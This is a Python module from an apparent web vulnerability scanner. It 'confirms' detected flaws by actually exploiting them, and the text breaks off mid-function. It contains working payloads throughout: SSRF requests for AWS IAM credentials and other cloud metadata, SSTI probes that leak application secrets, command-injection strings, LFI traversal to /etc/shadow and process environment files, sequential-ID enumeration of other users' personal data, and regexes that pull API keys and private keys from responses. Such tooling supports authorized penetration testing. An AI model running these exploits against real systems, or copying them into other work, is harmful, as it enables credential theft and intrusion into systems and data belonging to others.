"""
Vulnerability Confirmation Module

After a vulnerability is DETECTED, this module PROVES it works by actual exploitation:
- SQLi → extract DB version, tables, sample data (handled by deep_sqli already)
- XSS → confirm script reflection in executable context, extract DOM info
- SSRF → read cloud metadata, internal files, prove server-side request
- SSTI → execute expressions, prove template engine evaluation
- CMD Injection → execute unique commands, verify output
- LFI → read sensitive files (/etc/passwd, config files)
- IDOR → access multiple users' data, prove horizontal privilege escalation
- Path Traversal → read files beyond web root
- Auth Bypass → prove access to protected resources
- Info Disclosure → extract and classify sensitive data found

Each confirmation updates the Vulnerability record with:
- response_data["confirmation"] = {proof, extracted_data, exploitation_depth}
- Severity escalation when exploitation proves critical impact
- Title update with "[CONFIRMED]" prefix and exploitation details
"""
import asyncio
import json
import re
import logging
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import httpx

from app.utils.http_client import make_client

logger = logging.getLogger(__name__)


class VulnConfirmer:
    """Confirms and exploits detected vulnerabilities to prove real impact."""

    def __init__(self, rate_limit: asyncio.Semaphore | None = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(5)
        self._auth_cookie = None
        self._custom_headers: dict = {}

    def _http_client(self, **kwargs) -> httpx.AsyncClient:
        extra = dict(self._custom_headers)
        if self._auth_cookie:
            if self._auth_cookie.startswith("token="):
                token = self._auth_cookie.split("=", 1)[1]
                extra["Authorization"] = f"Bearer {token}"
            else:
                extra["Cookie"] = self._auth_cookie
        return make_client(extra_headers=extra, **kwargs)

    async def confirm_all(self, vulnerabilities: list, context: dict, db) -> dict:
        """Confirm all detected vulnerabilities by attempting exploitation.

        Args:
            vulnerabilities: list of Vulnerability ORM objects
            context: scan context dict
            db: async database session

        Returns:
            dict with stats: {confirmed, failed, escalated, total}
        """
        self._auth_cookie = context.get("auth_cookie")
        self._custom_headers = context.get("custom_headers", {})
        base_url = context.get("base_url", "")

        stats = {"confirmed": 0, "failed": 0, "escalated": 0, "total": len(vulnerabilities)}

        for vuln in vulnerabilities:
            try:
                vuln_type = vuln.vuln_type.value if hasattr(vuln.vuln_type, "value") else str(vuln.vuln_type)
                result = await self._confirm_vuln(vuln, vuln_type, base_url, db)
                if result.get("confirmed"):
                    stats["confirmed"] += 1
                    if result.get("escalated"):
                        stats["escalated"] += 1
                else:
                    stats["failed"] += 1
            except Exception as e:
                logger.debug(f"Confirmation error for {vuln.id}: {e}")
                stats["failed"] += 1

        return stats

    async def _confirm_vuln(self, vuln, vuln_type: str, base_url: str, db) -> dict:
        """Confirm a single vulnerability by type-specific exploitation."""
        # Skip if already confirmed
        existing = vuln.response_data or {}
        if existing.get("confirmation", {}).get("confirmed"):
            return {"confirmed": True, "escalated": False}

        # Route to type-specific confirmer
        confirmers = {
            "xss_reflected": self._confirm_xss,
            "xss_stored": self._confirm_xss,
            "xss_dom": self._confirm_xss,
            "ssrf": self._confirm_ssrf,
            "ssti": self._confirm_ssti,
            "cmd_injection": self._confirm_cmd_injection,
            "rce": self._confirm_cmd_injection,
            "lfi": self._confirm_lfi,
            "path_traversal": self._confirm_lfi,
            "idor": self._confirm_idor,
            "info_disclosure": self._confirm_info_disclosure,
            "auth_bypass": self._confirm_auth_bypass,
            "open_redirect": self._confirm_open_redirect,
            "cors_misconfiguration": self._confirm_cors,
            "misconfiguration": self._confirm_misconfig,
        }

        confirmer = confirmers.get(vuln_type)
        if not confirmer:
            # No specific confirmer — mark as detection-only
            return {"confirmed": False, "escalated": False}

        result = await confirmer(vuln, base_url)

        # If initial confirmation failed, try KB-sourced payloads as retry
        if not result.get("confirmed") and vuln.url and vuln_type in (
            "xss_reflected", "xss_stored", "sqli", "ssti", "cmd_injection", "ssrf"
        ):
            try:
                from app.core.knowledge import KnowledgeBase
                kb = KnowledgeBase()
                # Map confirmer vuln_type to KB vuln_type
                kb_type = vuln_type.split("_")[0] if "_" in vuln_type else vuln_type
                kb_payloads = await kb.get_effective_payloads(db, kb_type)
                if kb_payloads:
                    original_payload = vuln.payload_used
                    for kp in kb_payloads[:5]:  # Try top 5 KB payloads
                        alt_payload = kp.get("payload", "")
                        if not alt_payload or alt_payload == original_payload:
                            continue
                        vuln.payload_used = alt_payload
                        retry = await confirmer(vuln, base_url)
                        if retry.get("confirmed"):
                            result = retry
                            result["method"] = f"KB retry ({result.get('method', '')})"
                            break
                    if not result.get("confirmed"):
                        vuln.payload_used = original_payload  # Restore original
            except Exception as e:
                logger.debug(f"KB retry failed for {vuln.id}: {e}")

        if result.get("confirmed"):
            # Update vulnerability with confirmation proof
            response_data = vuln.response_data or {}
            response_data["confirmation"] = {
                "confirmed": True,
                "method": result.get("method", ""),
                "proof": result.get("proof", ""),
                "extracted_data": result.get("extracted_data"),
                "exploitation_depth": result.get("depth", "basic"),
            }
            vuln.response_data = response_data

            # Escalate severity if exploitation proved critical impact
            if result.get("escalate_to"):
                from app.models.vulnerability import Severity
                sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH}
                new_sev = sev_map.get(result["escalate_to"])
                if new_sev and new_sev != vuln.severity:
                    vuln.severity = new_sev
                    result["escalated"] = True

            # Update title with confirmation
            if not vuln.title.startswith("[CONFIRMED]"):
                detail = result.get("title_detail", "")
                vuln.title = f"[CONFIRMED] {vuln.title}" + (f" — {detail}" if detail else "")

            # Update impact with exploitation proof
            if result.get("impact_addition"):
                vuln.impact = (vuln.impact or "") + "\n\n**Exploitation Proof:**\n" + result["impact_addition"]

            await db.flush()

            # Record confirmed payload to KB
            try:
                from app.core.knowledge import KnowledgeBase
                kb = KnowledgeBase()
                await kb.record_successful_payload(db, vuln_type, vuln.payload_used, vuln.url)
            except Exception:
                pass

        return result

    # -----------------------------------------------------------------------
    # XSS Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_xss(self, vuln, base_url: str) -> dict:
        """Confirm XSS by sending payload and verifying reflection in executable context."""
        url = vuln.url
        payload = vuln.payload_used
        method = vuln.method or "GET"

        if not url or not payload:
            return {"confirmed": False}

        # Try multiple confirmation payloads
        confirm_payloads = [
            payload,  # Original
            f'<img src=x onerror="document.title=\'PHANTOM_XSS_CONFIRMED\'">',
            '<svg/onload=alert`PHANTOM`>',
            '"><img src=x onerror=alert(document.domain)>',
        ]

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=False) as client:
                    for test_payload in confirm_payloads:
                        try:
                            if method.upper() == "POST":
                                param = vuln.parameter or "input"
                                resp = await client.post(url, data={param: test_payload})
                            else:
                                # Inject into URL parameter
                                if vuln.parameter:
                                    parsed = urlparse(url)
                                    params = parse_qs(parsed.query, keep_blank_values=True)
                                    params[vuln.parameter] = [test_payload]
                                    new_query = urlencode(params, doseq=True)
                                    test_url = urlunparse(parsed._replace(query=new_query))
                                else:
                                    test_url = url
                                resp = await client.get(test_url)

                            body = resp.text
                            # Check if payload is reflected in executable context
                            if test_payload in body:
                                # Verify it's NOT inside a comment, textarea, or escaped
                                context = self._xss_context_check(test_payload, body)
                                if context["executable"]:
                                    return {
                                        "confirmed": True,
                                        "method": f"Payload reflected in {context['context']}",
                                        "proof": f"Payload '{test_payload[:80]}' reflected unescaped in HTTP response ({context['context']})",
                                        "extracted_data": {
                                            "reflected_payload": test_payload[:200],
                                            "response_context": context["context"],
                                            "response_snippet": context["snippet"][:500],
                                        },
                                        "depth": "reflected_xss",
                                        "title_detail": f"Reflected in {context['context']}",
                                        "impact_addition": f"XSS payload `{test_payload[:80]}` was reflected unescaped in the response body within {context['context']} context. This allows arbitrary JavaScript execution in victim's browser.",
                                    }
                        except Exception:
                            continue
            except Exception:
                pass

        return {"confirmed": False}

    def _xss_context_check(self, payload: str, body: str) -> dict:
        """Check what context an XSS payload landed in."""
        idx = body.find(payload)
        if idx == -1:
            return {"executable": False, "context": "not_found", "snippet": ""}

        # Get surrounding context
        start = max(0, idx - 200)
        end = min(len(body), idx + len(payload) + 200)
        snippet = body[start:end]

        # Check if inside HTML comment
        before = body[max(0, idx - 500):idx]
        if "<!--" in before and "-->" not in before[before.rfind("<!--"):]:
            return {"executable": False, "context": "html_comment", "snippet": snippet}

        # Check if inside <textarea>, <title>, <style>, <noscript>
        safe_tags = ["textarea", "title", "style", "noscript"]
        for tag in safe_tags:
            open_tag = f"<{tag}"
            close_tag = f"</{tag}"
            last_open = before.lower().rfind(open_tag)
            last_close = before.lower().rfind(close_tag)
            if last_open > last_close:
                return {"executable": False, "context": f"inside_{tag}", "snippet": snippet}

        # Check if HTML-encoded
        import html
        if html.escape(payload) in body and payload not in body:
            return {"executable": False, "context": "html_encoded", "snippet": snippet}

        # Check for script/event handler context
        if "<script" in payload.lower() or "onerror" in payload.lower() or "onload" in payload.lower():
            return {"executable": True, "context": "html_body_with_handler", "snippet": snippet}

        # Inside an attribute value
        attr_pattern = re.search(r'(?:value|href|src|action)\s*=\s*["\']?' + re.escape(payload[:20]), snippet, re.I)
        if attr_pattern:
            return {"executable": True, "context": "html_attribute", "snippet": snippet}

        return {"executable": True, "context": "html_body", "snippet": snippet}

    # -----------------------------------------------------------------------
    # SSRF Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_ssrf(self, vuln, base_url: str) -> dict:
        """Confirm SSRF by reading internal resources / cloud metadata."""
        url = vuln.url
        method = vuln.method or "GET"
        param = vuln.parameter

        if not url or not param:
            return {"confirmed": False}

        # Escalation payloads: try to read increasingly sensitive data
        ssrf_targets = [
            ("http://169.254.169.254/latest/meta-data/", "AWS EC2 metadata"),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"),
            ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "GCP metadata"),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata"),
            ("http://127.0.0.1:6379/INFO", "Local Redis"),
            ("file:///etc/passwd", "Local file read"),
            ("file:///etc/hostname", "Hostname read"),
            ("http://127.0.0.1:80/", "Localhost HTTP"),
        ]

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                    for target_url, desc in ssrf_targets:
                        try:
                            if method.upper() == "POST":
                                resp = await client.post(url, data={param: target_url})
                            else:
                                parsed = urlparse(url)
                                params = parse_qs(parsed.query, keep_blank_values=True)
                                params[param] = [target_url]
                                new_query = urlencode(params, doseq=True)
                                test_url = urlunparse(parsed._replace(query=new_query))
                                resp = await client.get(test_url)

                            body = resp.text
                            extracted = self._analyze_ssrf_response(body, desc)
                            if extracted:
                                escalate = "critical" if "credential" in desc.lower() or "iam" in desc.lower() else None
                                return {
                                    "confirmed": True,
                                    "method": f"SSRF to {desc}",
                                    "proof": f"Server fetched {target_url} and returned internal data",
                                    "extracted_data": extracted,
                                    "depth": "data_extraction",
                                    "escalate_to": escalate,
                                    "title_detail": f"Read {desc}",
                                    "impact_addition": f"SSRF confirmed: server-side request to `{target_url}` returned internal data:\n```\n{json.dumps(extracted, indent=2)[:500]}\n```",
                                }
                        except Exception:
                            continue
            except Exception:
                pass

        return {"confirmed": False}

    def _analyze_ssrf_response(self, body: str, desc: str) -> dict | None:
        """Extract meaningful data from SSRF response."""
        data = {}

        # AWS metadata
        if "ami-id" in body or "instance-id" in body:
            data["cloud"] = "AWS"
            for field in ["ami-id", "instance-id", "instance-type", "local-ipv4", "public-ipv4"]:
                match = re.search(rf"{field}[\":\s]+([^\s\"<,]+)", body)
                if match:
                    data[field] = match.group(1)

        # AWS IAM credentials
        if "AccessKeyId" in body:
            data["cloud"] = "AWS"
            data["iam_leak"] = True
            for field in ["AccessKeyId", "SecretAccessKey", "Token"]:
                match = re.search(rf'"{field}"\s*:\s*"([^"]+)"', body)
                if match:
                    data[field] = match.group(1)[:20] + "..." if len(match.group(1)) > 20 else match.group(1)

        # GCP metadata
        if "computeMetadata" in body or "project-id" in body.lower():
            data["cloud"] = "GCP"
            data["metadata_content"] = body[:300]

        # /etc/passwd
        if "root:x:" in body:
            data["file_read"] = "/etc/passwd"
            users = re.findall(r"^([^:]+):x:(\d+):", body, re.MULTILINE)
            data["users"] = [{"name": u[0], "uid": u[1]} for u in users[:10]]

        # Redis
        if "redis_version" in body:
            data["service"] = "redis"
            match = re.search(r"redis_version:(\S+)", body)
            if match:
                data["redis_version"] = match.group(1)

        return data if data else None

    # -----------------------------------------------------------------------
    # SSTI Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_ssti(self, vuln, base_url: str) -> dict:
        """Confirm SSTI by executing template expressions."""
        url = vuln.url
        param = vuln.parameter
        method = vuln.method or "GET"

        if not url or not param:
            return {"confirmed": False}

        # Increasingly dangerous SSTI payloads (read-only, no writes)
        ssti_probes = [
            # Unique math that can't appear naturally
            ("{{1337*1337}}", "1787569", "Jinja2/Twig math"),
            ("${1337*1337}", "1787569", "FreeMarker/Velocity math"),
            ("#{1337*1337}", "1787569", "Ruby ERB/Pebble math"),
            ("<%= 1337*1337 %>", "1787569", "ERB math"),
            # String operations
            ("{{\"PHANTOM\"*3}}", "PHANTOMPHANTOMPHANTOM", "Jinja2 string repeat"),
            # Config/env leak
            ("{{config}}", "SECRET_KEY", "Flask config leak"),
            ("{{settings.SECRET_KEY}}", "", "Django settings leak"),
            # OS info (read-only)
            ("{{self.__class__.__mro__}}", "object", "Jinja2 MRO access"),
        ]

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                    for payload, expected, desc in ssti_probes:
                        try:
                            if method.upper() == "POST":
                                resp = await client.post(url, data={param: payload})
                            else:
                                parsed = urlparse(url)
                                params = parse_qs(parsed.query, keep_blank_values=True)
                                params[param] = [payload]
                                new_query = urlencode(params, doseq=True)
                                test_url = urlunparse(parsed._replace(query=new_query))
                                resp = await client.get(test_url)

                            body = resp.text

                            # Check for expected output (the raw template must NOT be in response)
                            if expected and expected in body and payload not in body:
                                # Confirmed: engine evaluated our expression
                                escalate = "critical" if "config" in desc.lower() or "MRO" in desc.lower() else "high"
                                return {
                                    "confirmed": True,
                                    "method": desc,
                                    "proof": f"Template engine evaluated `{payload}` → found `{expected}` in response",
                                    "extracted_data": {
                                        "template_engine": desc.split()[0],
                                        "payload": payload,
                                        "evaluation_result": expected,
                                        "response_snippet": body[body.find(expected)-50:body.find(expected)+100][:300],
                                    },
                                    "depth": "code_execution",
                                    "escalate_to": escalate,
                                    "title_detail": f"{desc} — Code Execution",
                                    "impact_addition": f"SSTI confirmed: `{payload}` was evaluated by the template engine, producing `{expected}`. This proves server-side code execution capability.",
                                }

                            # Special: config leak — look for secrets in response
                            if "config" in payload.lower() and any(k in body.lower() for k in ["secret_key", "database", "password", "api_key"]):
                                secrets = {}
                                for pat in [r"SECRET_KEY['\"]?\s*[:=]\s*['\"]([^'\"]+)", r"PASSWORD['\"]?\s*[:=]\s*['\"]([^'\"]+)"]:
                                    m = re.search(pat, body, re.I)
                                    if m:
                                        secrets[pat.split("[")[0]] = m.group(1)[:30] + "..."

                                if secrets:
                                    return {
                                        "confirmed": True,
                                        "method": "Config/secrets leak via SSTI",
                                        "proof": f"Template config dump exposed application secrets",
                                        "extracted_data": {"secrets_found": secrets, "payload": payload},
                                        "depth": "secret_extraction",
                                        "escalate_to": "critical",
                                        "title_detail": "Secrets Leaked",
                                        "impact_addition": f"SSTI config leak: application secrets extracted via `{payload}`.",
                                    }
                        except Exception:
                            continue
            except Exception:
                pass

        return {"confirmed": False}

    # -----------------------------------------------------------------------
    # Command Injection Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_cmd_injection(self, vuln, base_url: str) -> dict:
        """Confirm command injection by executing unique commands."""
        url = vuln.url
        param = vuln.parameter
        method = vuln.method or "GET"

        if not url or not param:
            return {"confirmed": False}

        # Use unique markers to avoid false positives
        marker = "PHANTOM_CMD_7x3k9"
        cmd_probes = [
            # Echo with unique marker
            (f"; echo {marker}", marker, "semicolon echo"),
            (f"| echo {marker}", marker, "pipe echo"),
            (f"` echo {marker}`", marker, "backtick echo"),
            (f"$(echo {marker})", marker, "subshell echo"),
            # System info extraction
            ("; id", "uid=", "id command"),
            ("| cat /etc/hostname", "", "hostname read"),
            ("; uname -a", "Linux", "uname command"),
            # Windows variants
            ("& echo %USERNAME%", "", "Windows echo"),
            ("| type C:\\Windows\\win.ini", "[fonts]", "Windows file read"),
        ]

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                    for payload, expected, desc in cmd_probes:
                        try:
                            if method.upper() == "POST":
                                resp = await client.post(url, data={param: payload})
                            else:
                                parsed = urlparse(url)
                                params = parse_qs(parsed.query, keep_blank_values=True)
                                params[param] = [payload]
                                new_query = urlencode(params, doseq=True)
                                test_url = urlunparse(parsed._replace(query=new_query))
                                resp = await client.get(test_url)

                            body = resp.text

                            if expected and expected in body:
                                # Extract system info from response
                                extracted = {}
                                if "uid=" in body:
                                    uid_match = re.search(r"uid=(\d+)\(([^)]+)\)\s*gid=(\d+)\(([^)]+)\)", body)
                                    if uid_match:
                                        extracted = {
                                            "uid": uid_match.group(1),
                                            "user": uid_match.group(2),
                                            "gid": uid_match.group(3),
                                            "group": uid_match.group(4),
                                        }
                                if "Linux" in body:
                                    uname_match = re.search(r"Linux\s+\S+\s+[\d.\-]+\S*\s+#\d+", body)
                                    if uname_match:
                                        extracted["kernel"] = uname_match.group(0)[:100]

                                return {
                                    "confirmed": True,
                                    "method": desc,
                                    "proof": f"Command `{payload}` executed, output `{expected}` found in response",
                                    "extracted_data": extracted or {"marker_found": expected, "payload": payload},
                                    "depth": "command_execution",
                                    "escalate_to": "critical",
                                    "title_detail": f"RCE via {desc}",
                                    "impact_addition": f"Command injection confirmed: `{payload}` resulted in `{expected}` in response. Full remote code execution is possible.",
                                }
                        except Exception:
                            continue
            except Exception:
                pass

        return {"confirmed": False}

    # -----------------------------------------------------------------------
    # LFI / Path Traversal Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_lfi(self, vuln, base_url: str) -> dict:
        """Confirm LFI by reading sensitive files."""
        url = vuln.url
        param = vuln.parameter
        method = vuln.method or "GET"

        if not url:
            return {"confirmed": False}

        lfi_targets = [
            ("../../../../etc/passwd", "root:x:", "passwd file"),
            ("....//....//....//etc/passwd", "root:x:", "double-dot passwd"),
            ("..%2f..%2f..%2f..%2fetc/passwd", "root:x:", "encoded passwd"),
            ("/etc/shadow", "root:", "shadow file"),
            ("../../../../etc/hostname", "", "hostname file"),
            ("../../../../proc/self/environ", "PATH=", "process environment"),
            ("../../../../etc/nginx/nginx.conf", "server", "nginx config"),
            ("../../../../var/log/auth.log", "sshd", "auth log"),
            # PHP wrappers
            ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd", "PHP filter passwd"),
        ]

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                    for payload, expected, desc in lfi_targets:
                        try:
                            if param:
                                if method.upper() == "POST":
                                    resp = await client.post(url, data={param: payload})
                                else:
                                    parsed = urlparse(url)
                                    params = parse_qs(parsed.query, keep_blank_values=True)
                                    params[param] = [payload]
                                    new_query = urlencode(params, doseq=True)
                                    test_url = urlunparse(parsed._replace(query=new_query))
                                    resp = await client.get(test_url)
                            else:
                                # Direct URL path (path traversal)
                                resp = await client.get(url)

                            body = resp.text

                            if expected and expected in body:
                                extracted = {}
                                if "root:x:" in body:
                                    users = re.findall(r"^([^:]+):x:(\d+):(\d+):", body, re.MULTILINE)
                                    extracted["users"] = [{"name": u[0], "uid": u[1]} for u in users[:15]]
                                    extracted["file"] = "/etc/passwd"
                                elif "PATH=" in body:
                                    extracted["file"] = "/proc/self/environ"
                                    env_pairs = re.findall(r"([A-Z_]+)=([^\x00]+?)(?:\x00|$)", body)
                                    extracted["environment"] = {k: v[:50] for k, v in env_pairs[:10]}
                                else:
                                    extracted["file"] = desc
                                    extracted["content_preview"] = body[:500]

                                escalate = "critical" if "shadow" in desc or "environ" in desc else None
                                return {
                                    "confirmed": True,
                                    "method": f"LFI via {desc}",
                                    "proof": f"File `{payload}` read successfully, found `{expected}`",
                                    "extracted_data": extracted,
                                    "depth": "file_read",
                                    "escalate_to": escalate,
                                    "title_detail": f"Read {desc}",
                                    "impact_addition": f"LFI confirmed: `{payload}` read sensitive file. Extracted {len(extracted)} data points.",
                                }
                        except Exception:
                            continue
            except Exception:
                pass

        return {"confirmed": False}

    # -----------------------------------------------------------------------
    # IDOR Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_idor(self, vuln, base_url: str) -> dict:
        """Confirm IDOR by accessing multiple users' data."""
        url = vuln.url

        if not url:
            return {"confirmed": False}

        # Try accessing sequential IDs
        parsed = urlparse(url)
        path = parsed.path

        # Find numeric ID in path
        id_match = re.search(r'/(\d+)/?$', path)
        if not id_match:
            return {"confirmed": False}

        original_id = int(id_match.group(1))
        test_ids = [i for i in range(max(1, original_id - 2), original_id + 5) if i != original_id]

        accessed_records = []
        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                    for test_id in test_ids[:5]:
                        new_path = path[:id_match.start(1)] + str(test_id) + path[id_match.end(1):]
                        new_url = urlunparse(parsed._replace(path=new_path))
                        try:
                            resp = await client.get(new_url)
                            if resp.status_code == 200:
                                try:
                                    data = resp.json()
                                    # Check if different data than original
                                    data_str = json.dumps(data).lower()
                                    pii = ["email", "password", "phone", "address", "name", "token"]
                                    has_pii = sum(1 for p in pii if p in data_str)
                                    if has_pii >= 1:
                                        # Sanitize before storing
                                        preview = {}
                                        if isinstance(data, dict):
                                            for k, v in list(data.items())[:5]:
                                                preview[k] = str(v)[:50] if v else ""
                                        accessed_records.append({
                                            "id": test_id,
                                            "url": new_url,
                                            "data_preview": preview,
                                            "pii_fields": has_pii,
                                        })
                                except Exception:
                                    continue
                        except Exception:
                            continue
            except Exception:
                pass

        if len(accessed_records) >= 2:
            return {
                "confirmed": True,
                "method": f"Sequential ID enumeration ({len(accessed_records)} records accessed)",
                "proof": f"Accessed {len(accessed_records)} other users' records via IDOR",
                "extracted_data": {
                    "records_accessed": len(accessed_records),
                    "sample_records": accessed_records[:3],
                },
                "depth": "horizontal_privilege_escalation",
                "escalate_to": "high",
                "title_detail": f"{len(accessed_records)} Users' Data Accessed",
                "impact_addition": f"IDOR confirmed: accessed {len(accessed_records)} different users' records by changing the numeric ID in the URL. Data includes PII fields.",
            }

        return {"confirmed": False}

    # -----------------------------------------------------------------------
    # Info Disclosure Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_info_disclosure(self, vuln, base_url: str) -> dict:
        """Confirm info disclosure by extracting and classifying sensitive data."""
        url = vuln.url
        if not url:
            return {"confirmed": False}

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                    resp = await client.get(url)
                    if resp.status_code != 200:
                        return {"confirmed": False}

                    body = resp.text
                    extracted = self._extract_secrets(body)

                    if extracted:
                        escalate = "critical" if any(
                            k in extracted for k in ["aws_key", "private_key", "password", "api_key"]
                        ) else None
                        return {
                            "confirmed": True,
                            "method": "Secret extraction from exposed file",
                            "proof": f"Extracted {len(extracted)} sensitive items from {url}",
                            "extracted_data": extracted,
                            "depth": "secret_extraction",
                            "escalate_to": escalate,
                            "title_detail": f"{len(extracted)} Secrets Extracted",
                            "impact_addition": f"Sensitive data extracted from exposed endpoint. Found: {', '.join(extracted.keys())}",
                        }
            except Exception:
                pass

        return {"confirmed": False}

    def _extract_secrets(self, body: str) -> dict:
        """Extract secrets/credentials from response body."""
        secrets = {}
        patterns = {
            "aws_key": r"(?:AKIA|A3T[A-Z0-9])[A-Z0-9]{16,}",
            "private_key": r"-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----",
            "jwt": r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
            "github_token": r"gh[ps]_[A-Za-z0-9_]{36,}",
            "stripe_key": r"sk_(?:live|test)_[A-Za-z0-9]{20,}",
            "password": r"(?:password|passwd|pwd)\s*[=:]\s*['\"]?([^\s'\"]{4,30})",
            "api_key": r"(?:api[_-]?key|apikey)\s*[=:]\s*['\"]?([^\s'\"]{8,})",
            "database_url": r"(?:postgres|mysql|mongodb)://[^\s'\"]{10,}",
            "slack_token": r"xox[bpars]-[A-Za-z0-9-]{10,}",
        }
        for name, pattern in patterns.items():
            match = re.search(pattern, body, re.I)
            if match:
                val = match.group(1) if match.lastindex else match.group(0)
                # Truncate for safety
                secrets[name] = val[:40] + "..." if len(val) > 40 else val

        return secrets

    # -----------------------------------------------------------------------
    # Auth Bypass Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_auth_bypass(self, vuln, base_url: str) -> dict:
        """Confirm auth bypass by accessing protected resources."""
        url = vuln.url
        if not url:
            return {"confirmed": False}

        # Try to access admin/protected endpoints WITHOUT auth
        protected_paths = [
            "/admin", "/admin/dashboard", "/api/admin/users",
            "/api/users", "/dashboard", "/settings",
            "/api/v1/users", "/manage",
        ]

        accessed = []
        async with self.rate_limit:
            try:
                # Use a client WITHOUT auth cookies
                async with make_client(timeout=10.0) as client:
                    for path in protected_paths:
                        test_url = f"{base_url}{path}"
                        try:
                            resp = await client.get(test_url, follow_redirects=False)
                            if resp.status_code == 200 and len(resp.text) > 50:
                                body_lower = resp.text[:1000].lower()
                                # Skip SPA fallbacks
                                if "<!doctype html" in body_lower and "__next" in body_lower:
                                    continue
                                accessed.append({
                                    "url": test_url,
                                    "status": resp.status_code,
                                    "content_length": len(resp.text),
                                })
                        except Exception:
                            continue
            except Exception:
                pass

        if accessed:
            return {
                "confirmed": True,
                "method": f"Unauthenticated access to {len(accessed)} protected endpoints",
                "proof": f"Accessed protected resources without authentication",
                "extracted_data": {"accessible_endpoints": accessed},
                "depth": "auth_bypass",
                "escalate_to": "critical" if any("/admin" in a["url"] for a in accessed) else "high",
                "title_detail": f"{len(accessed)} Protected Endpoints Accessible",
                "impact_addition": f"Auth bypass confirmed: {len(accessed)} protected endpoints accessible without authentication.",
            }

        return {"confirmed": False}

    # -----------------------------------------------------------------------
    # Open Redirect Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_open_redirect(self, vuln, base_url: str) -> dict:
        """Confirm open redirect by following the redirect chain."""
        url = vuln.url
        param = vuln.parameter
        if not url:
            return {"confirmed": False}

        redirect_targets = [
            "https://evil.com",
            "//evil.com",
            "https://evil.com%00.legitimate.com",
        ]

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=False) as client:
                    for target in redirect_targets:
                        try:
                            if param:
                                parsed = urlparse(url)
                                params = parse_qs(parsed.query, keep_blank_values=True)
                                params[param] = [target]
                                new_query = urlencode(params, doseq=True)
                                test_url = urlunparse(parsed._replace(query=new_query))
                            else:
                                test_url = url

                            resp = await client.get(test_url)
                            if resp.status_code in (301, 302, 307, 308):
                                location = resp.headers.get("location", "")
                                if "evil.com" in location:
                                    return {
                                        "confirmed": True,
                                        "method": f"Redirect to {location}",
                                        "proof": f"Server redirects to attacker-controlled domain: {location}",
                                        "extracted_data": {"redirect_location": location, "payload": target},
                                        "depth": "redirect_confirmed",
                                        "title_detail": "Redirects to External Domain",
                                        "impact_addition": f"Open redirect confirmed: server redirects to `{location}` when given `{target}` as input. Can be used for phishing.",
                                    }
                        except Exception:
                            continue
            except Exception:
                pass

        return {"confirmed": False}

    # -----------------------------------------------------------------------
    # CORS Misconfiguration Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_cors(self, vuln, base_url: str) -> dict:
        """Confirm CORS misconfiguration by testing origin reflection."""
        url = vuln.url or base_url
        if not url:
            return {"confirmed": False}

        test_origins = [
            "https://evil.com",
            "https://attacker.example.com",
            f"https://evil.{urlparse(url).hostname}",
            "null",
        ]

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0) as client:
                    for origin in test_origins:
                        try:
                            headers = {"Origin": origin}
                            resp = await client.get(url, headers=headers)
                            acao = resp.headers.get("access-control-allow-origin", "")
                            acac = resp.headers.get("access-control-allow-credentials", "")

                            if acao == origin or acao == "*":
                                is_critical = acac.lower() == "true" and acao != "*"
                                return {
                                    "confirmed": True,
                                    "method": f"Origin reflection: {origin} → {acao}",
                                    "proof": f"Server reflects arbitrary origin in ACAO header with credentials={acac}",
                                    "extracted_data": {
                                        "tested_origin": origin,
                                        "acao": acao,
                                        "credentials": acac,
                                    },
                                    "depth": "cors_bypass",
                                    "escalate_to": "critical" if is_critical else None,
                                    "title_detail": f"Origin Reflection{' with Credentials' if is_critical else ''}",
                                    "impact_addition": f"CORS misconfiguration confirmed: `Origin: {origin}` reflected in ACAO header. Credentials: {acac}.",
                                }
                        except Exception:
                            continue
            except Exception:
                pass

        return {"confirmed": False}

    # -----------------------------------------------------------------------
    # Generic Misconfiguration Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_misconfig(self, vuln, base_url: str) -> dict:
        """Confirm misconfiguration by testing the specific issue."""
        url = vuln.url or base_url
        if not url:
            return {"confirmed": False}

        # Re-fetch the URL and verify the issue still exists
        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                    resp = await client.get(url)
                    if resp.status_code == 200:
                        body = resp.text[:3000].lower()

                        # Check for common misconfig indicators
                        indicators = {
                            "debug_mode": ["debug = true", "debug_mode", "stack trace", "traceback"],
                            "directory_listing": ["index of /", "directory listing", "parent directory"],
                            "server_info": ["server:", "x-powered-by:", "x-aspnet-version:"],
                            "default_page": ["apache2 ubuntu default page", "welcome to nginx", "iis windows server"],
                        }

                        found = {}
                        for category, patterns in indicators.items():
                            for pattern in patterns:
                                if pattern in body:
                                    found[category] = pattern
                                    break

                        # Also check response headers
                        for header in ["server", "x-powered-by", "x-aspnet-version", "x-debug"]:
                            val = resp.headers.get(header)
                            if val:
                                found[f"header_{header}"] = val

                        if found:
                            return {
